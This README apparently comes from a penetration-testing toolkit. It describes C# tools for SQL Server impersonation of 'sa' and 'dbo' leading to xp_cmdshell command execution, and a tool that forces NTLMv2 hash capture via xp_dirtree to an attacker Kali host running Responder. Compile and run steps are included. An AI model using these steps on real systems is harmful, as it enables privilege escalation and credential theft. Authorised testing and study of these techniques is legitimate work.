# ad enumeration

Three files. Two are C# tools, one is a documentation file. Both C# tools are **standalone** — compile and run independently.

---

## File Roles

| File | Standalone? | Role |
|------|-------------|------|
| `ComprehensiveImpersonation.cs` | Yes | Test SQL Server login/user impersonation chains |
| `Impersonate.cs` | Yes | Minimal — just trigger NTLM hash via SQL xp_dirtree |
| `JEA.md` | — | Notes on Just Enough Administration (JEA) |

---

## ComprehensiveImpersonation.cs

Tests two types of SQL Server impersonation that can lead to privilege escalation:

**Server-level:** `EXECUTE AS LOGIN = 'sa'`
- If your SQL user has IMPERSONATE permission on `sa`, you temporarily become sysadmin
- Can then enable `xp_cmdshell` as SA and execute OS commands

**Database-level:** `EXECUTE AS USER = 'dbo'` in `msdb`
- Switches to `dbo` in the msdb database
- `dbo` in msdb often has elevated permissions due to msdb being trustworthy

For each type, it shows: current user BEFORE → impersonate → current user AFTER → revert.

```
# Edit the connection string constants in the source:
#   string server   = "dc01.corp.local";
#   string database = "master";

# Compile — Visual Studio (Windows dev box):
#   File → New → Console App (.NET Framework), name "imptest", .NET Framework 4.8
#   Paste ComprehensiveImpersonation.cs, delete defaults
#   Right-click References → Add Reference → Assemblies → check System.Data → OK
#   Project → Properties → Build → Platform target: x64, ☑ Allow unsafe code
#   Build → Build Solution → bin\x64\Debug\imptest.exe
#   Alt: csc.exe /unsafe /platform:x64 /out:imptest.exe ComprehensiveImpersonation.cs
```

```cmd
# Run (uses current Windows credentials)
.\imptest.exe
```

---

## Impersonate.cs — Minimal NTLM Hash Trigger

The simplest possible SQL tool. Connects to SQL Server, runs `xp_dirtree \\<KALI_IP>\share`, captures the SQL service account's NTLMv2 hash on Responder.

Use this when you just need the hash and don't need the full `sql-v2.cs` toolkit.

```
# Edit connection string:
#   String sqlServer = "dc01.corp1.com";
#   String kaliIP    = "192.168.x.x";

# Compile — Visual Studio (Windows dev box):
#   File → New → Console App (.NET Framework), name "impers", .NET Framework 4.8
#   Paste Impersonate.cs, delete defaults
#   Right-click References → Add Reference → Assemblies → check System.Data → OK
#   Project → Properties → Build → Platform target: x64, ☑ Allow unsafe code
#   Build → Build Solution → bin\x64\Debug\impers.exe
#   Alt: csc.exe /unsafe /platform:x64 /out:impers.exe Impersonate.cs
```

```bash
# 1. Start Responder on Kali
sudo responder -I eth0 -wv

# 2. Run
.\impers.exe
```

---

## Decision: which SQL tool to use?

| I need to... | Use |
|-------------|-----|
| Just capture the hash | `Impersonate.cs` (simplest) |
| Test if I can impersonate SA/DBO | `ComprehensiveImpersonation.cs` |
| Do hash capture AND full enum | `05-lateral-movement/mssql/mssql-runner.cs` |
| Everything (xp_cmdshell, linked servers, OLE) | `05-lateral-movement/mssql/sql-v2.cs` |

---

## JEA.md

Documentation on Just Enough Administration — a PowerShell feature that limits which commands a user can run in a remote PS session. See the file for details on enumerating and escaping JEA.
